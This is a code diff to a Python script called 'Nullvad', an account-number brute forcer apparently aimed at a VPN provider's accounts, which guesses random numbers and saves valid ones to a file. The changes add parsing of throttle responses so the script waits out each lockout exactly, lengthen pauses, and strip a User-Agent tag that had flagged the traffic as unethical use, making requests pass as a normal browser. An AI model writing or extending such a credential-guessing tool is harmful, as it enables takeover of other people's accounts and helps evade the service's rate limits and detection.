@@ -8,6 +8,7 @@ import argparse
 import requests
 import json
 import random
+import re
 from os import system, name
 import time
 from colorama import init, Fore, Style
@@ -15,7 +16,7 @@ from plyer import notification
 
 # parse command-line arguments
 parser = argparse.ArgumentParser(description = 'Nullvad: Account # brute forcer. Do not use for unethical purposes.')
-parser.add_argument('-r', '--ratelimit', type = int, default = 20, help = 'Rate limit, in seconds. Default: 20')
+parser.add_argument('-r', '--ratelimit', type = int, default = 30, help = 'Rate limit, in seconds. Default: 20')
 parser.add_argument('-p', '--proxy', default = '', help = 'Proxy URL including scheme, i.e. socks5h://1.2.3.4:4145. Default: none')
 parser.add_argument('-g', '--guesses', type = int, default = 0, help = 'Number of requests to make. Default: Infinite')
 parser.add_argument('-n', '--newaccount', help = 'Register new account. Default 1, or enter number of accounts to create.')
@@ -26,7 +27,7 @@ init() # initialize colorama
 headers = {
     "Accept": "application/json, text/plain, */*",
     "Accept-Encoding": "gzip, deflate, br",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0 (Somebody is using my script for unethical purposes)",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
     "Content-Type": "application/json",
     }
 
@@ -74,9 +75,23 @@ def guess():
             file1.write(str(randnum) + '\n')
         print('Account number saved to goodaccounts.txt')
     elif resps.status_code == 503:
-        print(Fore.RED + 'Warning Rate limit broken! Pausing for 60 seconds' + Style.RESET_ALL)
-        notify_win('Rate limit broken. Pausing for 60 seconds.')
-        time.sleep(60)
+        print(Fore.RED + 'Warning Rate limit broken! Pausing for 120 seconds' + Style.RESET_ALL)
+        notify_win('Rate limit broken. Pausing for 120 seconds.')
+        time.sleep(120)
+    elif resps.status_code == 429:
+        # Throttled
+        # Example response.text: {"detail":"Request was throttled. Expected available in 3600 seconds.","code":"THROTTLED"}
+        if 'throttled' in resps.text:
+            cd = re.findall(r'\b\d+\b', resps.text)
+            # add 5 extra seconds to be safe
+            cd = int(cd[0]) + 5
+            print(Fore.RED + f'Warning: Throttled! Pausing for {cd} seconds' + Style.RESET_ALL)
+            notify_win(f'Throttled. Pausing for {cd} seconds.')
+            time.sleep(cd)
+        else:
+            print(Fore.RED + 'Warning: Throttled! Pausing for 3600 seconds' + Style.RESET_ALL)
+            notify_win('Throttled. Pausing for 3600 seconds.')
+            time.sleep(3601)
     else:
         print(Fore.RED + 'Invalid credential: ' + Style.RESET_ALL + str(randnum))
         with open('bad.txt', 'a') as file2:
